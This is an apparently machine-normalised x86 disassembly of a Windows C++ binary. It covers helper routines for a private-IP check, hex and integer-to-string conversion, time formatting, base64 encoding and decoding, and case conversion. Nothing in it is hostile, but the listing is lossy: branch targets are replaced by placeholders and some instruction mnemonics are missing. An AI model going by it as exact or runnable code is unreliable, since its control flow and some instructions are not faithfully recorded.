mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_429040
mov ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ inet_addr@IAT ]
cmp al 0xa
je r-xdata
mov al 0x1
retn
cmp al 0xac
jne r-xdata
cmp al 0xc0
jne r-xdata
cmp ah 0xf
jbe r-xdata
xor al al
retn
cmp ah 0xa8
je r-xdata
cmp ah 0x20
jb r-xdata
sub_429080
push 0xffffffff
push sub_432de3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x44 ]
mov [ esp + 0x2c ] eax
push edi
mov edi [ esp + 0x4c ]
mov eax esi
or eax edi
mov [ esp + 0x8 ] 0x0
jne r-xdata
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x3c ] 0x1
push ebx
mov esi [ esp + 0x44 ]
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x8 ] 0x1
jmp r-xdata
push 0x0
push 0xa
push edi
push esi
call sub_42ea10
add cl 0x30
mov [ esp + 0x4c ] cl
mov ecx [ esp + 0x4c ]
push ecx
push 0x1
push 0x0
lea ecx [ esp + 0x24 ]
mov [ esp + 0x20 ] ebx
mov esi eax
mov edi edx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::insert@IAT ]
mov edx esi
or edx edi
jne r-xdata
mov esi [ esp + 0x48 ]
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xc ] 0x1
mov [ esp + 0x40 ] 0x0
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop ebx
mov ecx [ esp + 0x34 ]
mov eax esi
pop edi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x2c ]
pop esi
call sub_42e72f
add esp 0x38
retn
sub_429160
push 0xffffffff
push sub_432e13
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
mov eax [ rw-data ]
mov [ esp ] 0x0
push esi
push edi
mov edi [ esp + 0x54 ]
mov [ esp + 0x38 ] eax
lea eax [ edi + edi + 0x1 ]
push eax
mov [ esp + 0x10 ] 0x30
mov [ esp + 0x11 ] 0x31
mov [ esp + 0x12 ] 0x32
mov [ esp + 0x13 ] 0x33
mov [ esp + 0x14 ] 0x34
mov [ esp + 0x15 ] 0x35
mov [ esp + 0x16 ] 0x36
mov [ esp + 0x17 ] 0x37
mov [ esp + 0x18 ] 0x38
mov [ esp + 0x19 ] 0x39
mov [ esp + 0x1a ] 0x41
mov [ esp + 0x1b ] 0x42
mov [ esp + 0x1c ] 0x43
mov [ esp + 0x1d ] 0x44
mov [ esp + 0x1e ] 0x45
mov [ esp + 0x1f ] 0x46
call j_sub_42e3bc
mov esi eax
add esp 0x4
xor eax eax
test edi edi
jbe r-xdata
push esi
lea ecx [ esp + 0x20 ]
mov [ esi + eax * 2 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi 0x1
mov [ esp + 0x44 ] edi
push esi
call ??_V@YAXPAX@Z
mov esi [ esp + 0x50 ]
add esp 0x4
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x8 ] edi
mov [ esp + 0x44 ] 0x0
lea ecx [ esp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x3c ]
mov eax esi
pop edi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x34 ]
pop esi
call sub_42e72f
add esp 0x40
retn
mov ecx [ esp + 0x50 ]
jmp r-xdata
movzx edx [ eax + ecx ]
shr edx 0x4
mov dl [ esp + edx + 0xc ]
mov [ esi + eax * 2 ] dl
movzx edx [ eax + ecx ]
and edx 0x8000000f
jns r-xdata
mov dl [ esp + edx + 0xc ]
mov [ esi + eax * 2 + 0x1 ] dl
inc eax
cmp eax edi
jb r-xdata
dec edx
or edx 0xfffffff0
inc edx
sub_429290
push 0xffffffff
push sub_432e43
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
mov eax [ rw-data ]
push esi
lea ecx [ esp + 0x8 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x4 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x30 ] 0x1
movzx esi [ esp + 0x3c ]
mov eax esi
sar eax 0x4
and eax 0xf
cmp eax 0x9
jle r-xdata
add al 0x30
mov [ esp + 0x3c ] al
mov ecx [ esp + 0x3c ]
push ecx
add al 0x37
mov [ esp + 0x3c ] al
mov eax [ esp + 0x3c ]
push eax
jmp r-xdata
add al 0x30
mov [ esp + 0x3c ] al
mov eax [ esp + 0x3c ]
push eax
add al 0x37
mov [ esp + 0x3c ] al
mov edx [ esp + 0x3c ]
push edx
jmp r-xdata
lea ecx [ esp + 0xc ]
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
and esi 0xf
mov eax esi
cmp eax 0x9
lea ecx [ esp + 0x8 ]
jle r-xdata
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov esi [ esp + 0x38 ]
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x28 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x24 ]
pop esi
call sub_42e72f
add esp 0x30
retn
sub_429380
push 0xffffffff
push sub_432e6a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ rw-data ]
mov ecx [ esp + 0x2c ]
push esi
mov [ esp + 0x18 ] eax
push 0xa
lea eax [ esp + 0xc ]
push eax
push ecx
mov [ esp + 0x10 ] 0x0
call [ _itoa@IAT ]
mov esi [ esp + 0x38 ]
add esp 0xc
lea edx [ esp + 0x8 ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x1c ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x4 ] 0x1
pop esi
call sub_42e72f
add esp 0x24
retn
sub_429400
push 0xffffffff
push sub_432e9a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
mov eax [ rw-data ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x3c ]
push esi
mov [ esp + 0x28 ] eax
push 0xa
lea eax [ esp + 0xc ]
push eax
push ecx
push edx
mov [ esp + 0x14 ] 0x0
call [ _i64toa@IAT ]
mov esi [ esp + 0x4c ]
add esp 0x10
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x2c ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x28 ]
mov [ esp + 0x4 ] 0x1
pop esi
call sub_42e72f
add esp 0x34
retn
sub_429480
push 0xffffffff
push sub_432eca
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ rw-data ]
mov ecx [ esp + 0x2c ]
push esi
mov [ esp + 0x18 ] eax
push 0xa
lea eax [ esp + 0xc ]
push eax
push ecx
mov [ esp + 0x10 ] 0x0
call [ _ultoa@IAT ]
mov esi [ esp + 0x38 ]
add esp 0xc
lea edx [ esp + 0x8 ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x1c ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x4 ] 0x1
pop esi
call sub_42e72f
add esp 0x24
retn
sub_429500
push 0xffffffff
push sub_432efa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
mov eax [ rw-data ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x3c ]
push esi
mov [ esp + 0x28 ] eax
push 0xa
lea eax [ esp + 0xc ]
push eax
push ecx
push edx
mov [ esp + 0x14 ] 0x0
call [ _ui64toa@IAT ]
mov esi [ esp + 0x4c ]
add esp 0x10
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x2c ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x28 ]
mov [ esp + 0x4 ] 0x1
pop esi
call sub_42e72f
add esp 0x34
retn
sub_429580
push 0xffffffff
push sub_432f3c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
mov eax [ rw-data ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x50 ] eax
mov [ esp ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x5c ] 0x1
lea eax [ esp + 0x68 ]
push eax
call [ localtime@IAT ]
add esp 0x4
test eax eax
je r-xdata
push esi
mov esi [ esp + 0x68 ]
lea ecx [ esp + 0x38 ]
push ecx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x60 ] 0x0
lea ecx [ esp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x58 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x54 ]
pop esi
call sub_42e72f
add esp 0x60
retn
xor ecx ecx
mov [ esp + 0x21 ] ecx
mov [ esp + 0x25 ] ecx
push eax
mov [ esp + 0x2d ] ecx
push r--data
mov [ esp + 0x35 ] ecx
lea edx [ esp + 0x28 ]
mov [ esp + 0x39 ] cx
push 0x14
push edx
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x43 ] cl
call [ strftime@IAT ]
add esp 0x10
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x5c ] 0x2
push eax
lea ecx [ esp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ esp + 0x5c ] 0x1
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_429680
push 0xffffffff
push sub_432f7c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
mov eax [ rw-data ]
push ebx
push esi
xor esi esi
push edi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x48 ] eax
mov [ esp + 0xc ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ebx 0x1
mov [ esp + 0x54 ] ebx
mov edi [ esp + 0x60 ]
xor eax eax
mov al [ esi + edi ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
call sub_429290
add esp 0x8
mov [ esp + 0x54 ] 0x2
push eax
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x54 ] bl
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc esi
cmp esi 0x14
jb r-xdata
mov esi [ esp + 0x5c ]
lea edx [ esp + 0x2c ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xc ] ebx
mov [ esp + 0x54 ] 0x0
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x4c ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x40 ]
pop ebx
call sub_42e72f
add esp 0x4c
retn
sub_429740
push 0xffffffff
push sub_432fb3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
mov eax [ rw-data ]
push ebx
push ebp
mov [ esp + 0x30 ] eax
mov [ esp + 0x10 ] 0x0
push esi
mov esi [ esp + 0x4c ]
mov ebp [ esi + 0x14 ]
mov eax ebp
cdq
mov ecx 0x3
idiv ecx
mov eax ecx
push edi
sub eax edx
cdq
idiv ecx
mov ebx edx
lea eax [ ebx + ebp ]
push eax
mov [ esp + 0x54 ] eax
call j_sub_42e3bc
mov edi eax
add esp 0x4
mov ecx esi
mov [ esp + 0x10 ] edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
mov esi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test ebx ebx
[ edi ] [ esi ]
jle r-xdata
mov eax 0x55555556
imul [ esp + 0x50 ]
mov edi edx
shr edi 0x1f
add edi edx
lea eax [ edi * 4 + 0x1 ]
push eax
call j_sub_42e3bc
add esp 0x4
test edi edi
mov [ esp + 0x14 ] eax
jle r-xdata
mov eax [ esp + 0x10 ]
mov ecx ebx
mov edx ecx
shr ecx 0x2
lea edi [ eax + ebp ]
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
test ebx ebx
mov [ eax + edi * 4 ] 0x0
jle r-xdata
mov esi [ esp + 0x10 ]
lea ecx [ eax + 0x2 ]
inc esi
mov ebp edi
jmp r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call ??_V@YAXPAX@Z
mov esi [ esp + 0x18 ]
add esp 0x4
push esi
lea ecx [ esp + 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi 0x1
mov [ esp + 0x44 ] edi
push esi
call ??_V@YAXPAX@Z
mov esi [ esp + 0x50 ]
add esp 0x4
lea edx [ esp + 0x1c ]
push edx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x44 ] 0x0
lea ecx [ esp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x3c ]
pop edi
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x2c ]
pop ebx
call sub_42e72f
add esp 0x38
retn
lea edi [ eax + edi * 4 - 0x1 ]
mov dl [ esi + 0x1 ]
mov al [ esi ]
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x50 ] dl
mov dl [ esi - 0x1 ]
mov [ esp + 0x52 ] dl
mov [ esp + 0x51 ] al
mov eax [ esp + 0x50 ]
mov edx eax
sar edx 0x12
and edx 0x3f
mov dl [ edx + rw-data ]
mov [ ecx - 0x2 ] dl
mov edx eax
sar edx 0xc
and edx 0x3f
mov dl [ edx + rw-data ]
mov [ ecx - 0x1 ] dl
mov edx eax
sar edx 0x6
and edx 0x3f
mov dl [ edx + rw-data ]
and eax 0x3f
mov [ ecx ] dl
mov al [ eax + rw-data ]
mov [ ecx + 0x1 ] al
add esi 0x3
add ecx 0x4
dec ebp
jne r-xdata
mov [ edi ] 0x3d
dec edi
dec ebx
jne r-xdata
mov eax [ esp + 0x14 ]
sub_429920
push 0xffffffff
push sub_432fe3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
mov eax [ rw-data ]
push ebx
push ebp
push esi
mov esi [ esp + 0x60 ]
mov [ esp + 0x48 ] eax
mov [ esp + 0x20 ] 0x0
mov ebp [ esi + 0x14 ]
lea eax [ ebp + ebp * 2 ]
cdq
and edx 0x3
add eax edx
mov ebx eax
push edi
sar ebx 0x2
push ebp
mov [ esp + 0x2c ] ebx
call j_sub_42e3bc
mov edi eax
add esp 0x4
mov ecx esi
mov [ esp + 0x1c ] edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
mov ecx ebp
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call j_sub_42e3bc
mov edi eax
mov eax ebp
cdq
and edx 0x3
add eax edx
sar eax 0x2
add esp 0x4
dec eax
inc eax
mov [ esp + 0x18 ] edi
mov [ esp + 0x64 ] 0x0
je r-xdata
sub ebx [ esp + 0x64 ]
push ebx
push edi
lea ecx [ esp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi 0x1
mov [ esp + 0x58 ] edi
mov ecx [ esp + 0x18 ]
push ecx
call ??_V@YAXPAX@Z
mov edx [ esp + 0x20 ]
push edx
call ??_V@YAXPAX@Z
mov esi [ esp + 0x68 ]
add esp 0x8
lea eax [ esp + 0x30 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x24 ] edi
mov [ esp + 0x58 ] 0x0
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x50 ]
pop edi
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x40 ]
pop ebx
call sub_42e72f
add esp 0x4c
retn
mov ebp [ esp + 0x1c ]
lea ecx [ esp + 0x10 ]
lea esi [ esp + 0x10 ]
sub ecx 0x2
dec esi
mov [ esp + 0x20 ] ecx
inc edi
mov [ esp + 0x14 ] eax
mov [ esp + eax + 0x10 ] cl
inc ecx
cmp ecx 0x41
jl r-xdata
mov dl [ eax + ebp ]
mov [ esp + eax + 0x2c ] dl
xor ecx ecx
movzx edx dl
mov dl [ esp + eax + 0xf ]
dec eax
cmp dl 0x40
jne r-xdata
movsx ebx [ ecx + rw-data ]
cmp edx ebx
je r-xdata
jmp r-xdata
mov cl [ esi + eax ]
and cl 0x3
shl cl 0x6
add dl cl
mov [ esp + eax + 0x10 ] dl
mov [ edi + 0x1 ] dl
inc [ esp + 0x64 ]
jmp r-xdata
inc eax
cmp eax 0x4
jl r-xdata
mov cl [ esi + eax - 0x1 ]
and cl 0xf
shl cl 0x4
shr dl 0x2
add dl cl
mov [ esi + eax ] dl
mov [ edi ] dl
inc [ esp + 0x64 ]
jmp r-xdata
mov dl [ esi + eax ]
cmp dl 0x40
jne r-xdata
mov cl [ esi + eax - 0x2 ]
and cl 0x3f
shl cl 0x2
shr dl 0x4
add dl cl
mov [ ebx + eax ] dl
mov [ edi - 0x1 ] dl
inc [ esp + 0x64 ]
jmp r-xdata
mov ebx [ esp + 0x20 ]
mov dl [ ebx + eax ]
cmp dl 0x40
jne r-xdata
xor eax eax
mov ebx [ esp + 0x28 ]
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
add ebp 0x4
add edi 0x3
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
sub_429b00
push 0xffffffff
push sub_433013
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
mov eax [ rw-data ]
push ebx
push esi
xor esi esi
push edi
lea ecx [ esp + 0x10 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0xc ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x38 ] 0x1
mov edi [ esp + 0x44 ]
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
mov ebx eax
push ebx
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
cmp ebx esi
jle r-xdata
mov esi [ esp + 0x40 ]
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xc ] 0x1
mov [ esp + 0x38 ] 0x0
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x30 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x24 ]
pop ebx
call sub_42e72f
add esp 0x30
retn
push ebp
lea ebx [ ebx ]
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push esi
lea ecx [ esp + 0x18 ]
mov ebp eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov dl [ ebp ]
mov [ eax ] dl
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] 0x7a
jg r-xdata
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] 0x61
jl r-xdata
pop ebp
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push esi
lea ecx [ esp + 0x18 ]
mov ebp eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov cl [ ebp ]
sub cl 0x20
mov [ eax ] cl
jmp r-xdata
inc esi
cmp esi ebx
jl r-xdata
sub_429c10
push 0xffffffff
push sub_433043
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
mov eax [ rw-data ]
push ebx
push esi
xor esi esi
push edi
lea ecx [ esp + 0x10 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0xc ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x38 ] 0x1
mov edi [ esp + 0x44 ]
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
mov ebx eax
push ebx
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
cmp ebx esi
jle r-xdata
mov esi [ esp + 0x40 ]
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xc ] 0x1
mov [ esp + 0x38 ] 0x0
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x30 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x24 ]
pop ebx
call sub_42e72f
add esp 0x30
retn
push ebp
lea ebx [ ebx ]
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push esi
lea ecx [ esp + 0x18 ]
mov ebp eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov dl [ ebp ]
mov [ eax ] dl
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] 0x5a
jg r-xdata
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] 0x41
jl r-xdata
pop ebp
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push esi
lea ecx [ esp + 0x18 ]
mov ebp eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov cl [ ebp ]
add cl 0x20
mov [ eax ] cl
jmp r-xdata
inc esi
cmp esi ebx
jl r-xdata
sub_429d20
push 0xffffffff
push sub_43306a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
mov eax [ rw-data ]
push ebx
xor edx edx
mov [ esp + 0x4 ] edx
push esi
mov esi [ esp + 0x74 ]
mov [ esp + 0x5c ] eax
push edi
mov [ esp + 0x10 ] 0x30
mov [ esp + 0x11 ] 0x31
mov [ esp + 0x12 ] 0x32
mov [ esp + 0x13 ] 0x33
mov [ esp + 0x14 ] 0x34
mov [ esp + 0x15 ] 0x35
mov [ esp + 0x16 ] 0x36
mov [ esp + 0x17 ] 0x37
mov [ esp + 0x18 ] 0x38
mov [ esp + 0x19 ] 0x39
mov [ esp + 0x1a ] 0x41
mov [ esp + 0x1b ] 0x42
mov [ esp + 0x1c ] 0x43
mov [ esp + 0x1d ] 0x44
mov [ esp + 0x1e ] 0x45
mov [ esp + 0x1f ] 0x46
xor eax eax
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x21 ] cl
movzx ecx [ esi + eax + 0x1 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x22 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x23 ] cl
movzx ecx [ esi + eax + 0x2 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x24 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x25 ] cl
movzx ecx [ esi + eax + 0x3 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x26 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x27 ] cl
movzx ecx [ esi + eax + 0x4 ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x28 ] bl
jns r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov cl [ esp + ecx + 0x10 ]
mov [ esp + eax * 2 + 0x29 ] cl
add eax 0x5
cmp eax 0x14
jb r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
movzx ecx [ esi + eax ]
mov edi ecx
shr edi 0x4
and ecx 0x8000000f
mov bl [ esp + edi + 0x10 ]
mov [ esp + eax * 2 + 0x20 ] bl
jns r-xdata
mov esi [ esp + 0x74 ]
mov [ esp + eax * 2 + 0x20 ] dl
lea edx [ esp + 0x20 ]
push edx
mov ecx esi
